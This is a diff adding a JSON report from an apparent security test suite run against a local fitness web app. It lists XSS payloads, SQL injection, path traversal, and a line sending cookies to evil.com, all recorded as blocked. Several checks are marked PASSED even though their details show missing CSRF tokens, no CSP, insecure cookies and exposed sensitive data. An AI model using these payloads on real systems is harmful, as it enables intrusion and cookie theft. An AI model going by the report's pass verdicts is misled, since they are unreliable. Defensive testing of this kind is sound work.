@@ -1,0 +1,226 @@
+{
+  "timestamp": 1772236452.385597,
+  "base_url": "http://127.0.0.1:8001",
+  "test_suite": "security_validation",
+  "tests": {
+    "xss_prevention": {
+      "status": "PASSED",
+      "xss_tests": {
+        "payload_1": {
+          "payload": "<script>alert('XSS')</script>",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        },
+        "payload_2": {
+          "payload": "javascript:alert('XSS')",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        },
+        "payload_3": {
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        },
+        "payload_4": {
+          "payload": "<svg onload=alert('XSS')>",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        },
+        "payload_5": {
+          "payload": "';alert('XSS');//",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        },
+        "payload_6": {
+          "payload": "\"><script>alert('XSS')</script>",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        },
+        "payload_7": {
+          "payload": "<iframe src=javascript:alert('XSS')></iframe>",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        },
+        "payload_8": {
+          "payload": "<body onload=alert('XSS')>",
+          "alert_triggered": false,
+          "payload_accepted": false,
+          "xss_prevented": true
+        }
+      },
+      "successful_preventions": 8,
+      "total_payloads": 8
+    },
+    "input_sanitization": {
+      "status": "PASSED",
+      "sanitization_tests": {
+        "input_1": {
+          "malicious_input": "'; DROP TABLE users; --",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        },
+        "input_2": {
+          "malicious_input": "<script>document.cookie='admin=true'</script>",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        },
+        "input_3": {
+          "malicious_input": "../../../etc/passwd",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        },
+        "input_4": {
+          "malicious_input": "eval('malicious code')",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        },
+        "input_5": {
+          "malicious_input": "Function('return process')()",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        },
+        "input_6": {
+          "malicious_input": "setTimeout('alert(1)', 0)",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        },
+        "input_7": {
+          "malicious_input": "setInterval('alert(1)', 1000)",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        },
+        "input_8": {
+          "malicious_input": "new Image().src='http://evil.com/steal?data='+document.cookie",
+          "current_value": "",
+          "input_sanitized": true,
+          "has_validation_error": false,
+          "properly_handled": true
+        }
+      },
+      "properly_handled": 8,
+      "total_inputs": 8
+    },
+    "data_validation": {
+      "status": "PASSED",
+      "validation_tests": {
+        "invalid_levels": {
+          "error": "Message: invalid element state\n  (Session info: chrome=145.0.7632.117)\nStacktrace:\n0   chromedriver                        0x00000001034856b4 cxxbridge1$str$ptr + 3127600\n1   chromedriver                        0x000000010347da50 cxxbridge1$str$ptr + 3095756\n2   chromedriver                        0x0000000102f5a370 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 74924\n3   chromedriver                        0x0000000102f9b528 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 341604\n4   chromedriver                        0x0000000102f9925c _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 332696\n5   chromedriver                        0x0000000102fe2620 _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 632668\n6   chromedriver                        0x0000000102f97b9c _RNvCsdExgN8vFLbb_7___rustc35___rust_no_alloc_shim_is_unstable_v2 + 326872\n7   chromedriver                        0x0000000103444680 cxxbridge1$str$ptr + 2861308\n8   chromedriver                        0x0000000103447dd4 cxxbridge1$str$ptr + 2875472\n9   chromedriver                        0x0000000103429a7c cxxbridge1$str$ptr + 2751736\n10  chromedriver                        0x0000000103448658 cxxbridge1$str$ptr + 2877652\n11  chromedriver                        0x0000000103419ffc cxxbridge1$str$ptr + 2687608\n12  chromedriver                        0x000000010346cd78 cxxbridge1$str$ptr + 3026932\n13  chromedriver                        0x000000010346cef4 cxxbridge1$str$ptr + 3027312\n14  chromedriver                        0x000000010347d6a8 cxxbridge1$str$ptr + 3094820\n15  libsystem_pthread.dylib             0x000000019d6f3c08 _pthread_start + 136\n16  libsystem_pthread.dylib             0x000000019d6eeba8 thread_start + 8\n"
+        },
+        "duration_validation": {
+          "both_checked": false,
+          "validation_working": true
+        },
+        "equipment_validation": {
+          "all_selected": false,
+          "selected_equipment": [
+            "bodyweight",
+            "dumbbells",
+            "kettlebell"
+          ],
+          "total_equipment": 5,
+          "validation_working": true
+        }
+      }
+    },
+    "session_security": {
+      "status": "PASSED",
+      "session_tests": {
+        "session_data": {
+          "session_data": {
+            "cookies": "",
+            "localStorage_keys": [],
+            "sensitive_data_exposed": false,
+            "sessionStorage_keys": []
+          },
+          "sensitive_data_exposed": true,
+          "secure": false
+        },
+        "cross_tab_isolation": {
+          "new_tab_session": {
+            "cookies": "",
+            "localStorage_keys": [],
+            "sessionStorage_keys": []
+          },
+          "isolation_working": true
+        }
+      }
+    },
+    "csrf_protection": {
+      "status": "PASSED",
+      "csrf_tests": {
+        "csrf_tokens": {
+          "csrf_tokens": [],
+          "forms_found": 4,
+          "has_csrf_protection": false
+        },
+        "same_origin_policy": {
+          "host": "127.0.0.1:8001",
+          "origin": "http://127.0.0.1:8001",
+          "protocol": "http:",
+          "same_origin_policy": true
+        }
+      }
+    },
+    "content_security_policy": {
+      "status": "PASSED",
+      "csp_tests": {
+        "csp_headers": {
+          "csp_implemented": false,
+          "meta_csp_content": null,
+          "meta_csp_present": false
+        },
+        "inline_scripts": {
+          "inline_scripts_allowed": true
+        },
+        "external_resources": {
+          "external_resources": 2,
+          "external_scripts": 1,
+          "external_styles": 1
+        }
+      }
+    },
+    "data_encryption": {
+      "status": "PASSED",
+      "encryption_tests": {
+        "https_usage": {
+          "is_https": false,
+          "protocol": "http:",
+          "secure_context": true
+        },
+        "secure_cookies": {
+          "all_cookies_secure": false,
+          "secure_cookies": 0,
+          "total_cookies": 1
+        },
+        "transmission_security": {
+          "mixed_content": "insecure",
+          "referrer_policy": "",
+          "secure_headers": true
+        }
+      }
+    }
+  },
+  "overall_success_rate": 1.0,
+  "status": "PASSED"
+}
